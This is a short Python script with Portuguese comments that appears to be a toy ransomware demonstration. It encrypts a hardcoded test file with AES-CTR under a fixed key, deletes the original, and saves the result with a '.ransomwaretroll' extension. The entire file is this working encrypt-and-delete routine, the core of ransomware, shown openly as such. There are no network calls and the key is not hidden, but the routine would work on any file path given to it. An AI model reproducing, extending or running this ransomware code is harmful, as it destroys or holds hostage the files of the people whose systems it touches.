import os
import pyaes


def encrypt_file(file_name, key):
    try:
        ## Abrir o arquivo a ser criptografado
        with open(file_name, "rb") as file:
            file_data = file.read()
    except FileNotFoundError:
        print(f"Erro: O arquivo '{file_name}' não foi encontrado.")
        return

    ## Inicializar AES
    aes = pyaes.AESModeOfOperationCTR(key)

    ## Criptografar o arquivo
    crypto_data = aes.encrypt(file_data)

    ## Remover o arquivo original
    os.remove(file_name)

    ## Salvar o arquivo criptografado
    new_file_name = file_name + ".ransomwaretroll"
    with open(new_file_name, "wb") as new_file:
        new_file.write(crypto_data)


if __name__ == "__main__":
    ## Nome do arquivo e chave de criptografia
    file_name = "teste.txt"
    key = b"testeransomwares"

    ## Chamar a função para criptografar o arquivo
    encrypt_file(file_name, key)
